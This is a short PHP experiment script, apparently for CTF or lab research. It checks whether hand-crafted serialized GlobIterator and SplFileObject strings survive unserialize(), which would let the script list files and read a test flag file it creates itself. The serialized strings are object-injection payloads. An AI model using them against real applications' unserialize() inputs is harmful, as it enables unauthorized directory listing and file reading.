<?php
// 实验：serialize 被禁的类，手搓串 unserialize 收不收？
error_reporting(E_ALL & ~E_NOTICE);

echo "=== 手搓 GlobIterator ===\n";
$cands = array(
    'protected带\\0' => 'O:13:"GlobIterator":2:{s:10:"' . "\0*\0" . 'flags";i:0;s:12:"' . "\0*\0" . 'pattern";s:7:"glob://*";}',
    '裸名'           => 'O:13:"GlobIterator":2:{s:5:"flags";i:0;s:7:"pattern";s:7:"glob://*";}',
);
foreach ($cands as $label => $c) {
    echo "[{$label}] ";
    $g = @unserialize($c);
    if ($g === false) { echo "拒收\n"; continue; }
    echo get_class($g), " 收了！";
    try {
        $out = array();
        $n = 0;
        foreach ($g as $f) { $out[] = (string)$f; if (++$n >= 6) break; }
        echo " 列出：", implode(' | ', $out), "\n";
    } catch (Throwable $t) {
        echo " 迭代报错：", $t->getMessage(), "\n";
    }
}

echo "\n=== 手搓 SplFileObject（读 flag 文件试试）===\n";
$fcands = array(
    'protected带\\0' => 'O:13:"SplFileObject":2:{s:9:"' . "\0*\0" . 'fileName";s:' . strlen(__DIR__ . '/flag_test.txt') . ':"' . __DIR__ . '/flag_test.txt";s:7:"' . "\0*\0" . 'openMode";s:1:"r";}',
    '裸名fileName'   => 'O:13:"SplFileObject":1:{s:8:"fileName";s:' . strlen(__DIR__ . '/flag_test.txt') . ':"' . __DIR__ . '/flag_test.txt";}',
);
file_put_contents(__DIR__ . '/flag_test.txt', "flag{splfileobject_read_ok}\n");
foreach ($fcands as $label => $c) {
    echo "[{$label}] ";
    $g = @unserialize($c);
    if ($g === false) { echo "拒收\n"; continue; }
    echo get_class($g), " 收了！";
    try {
        $g->rewind();
        $first = $g->current();
        echo " 首行：", var_export((string)$first, true), "\n";
    } catch (Throwable $t) {
        echo " 读报错：", $t->getMessage(), "\n";
    }
}
unlink(__DIR__ . '/flag_test.txt');
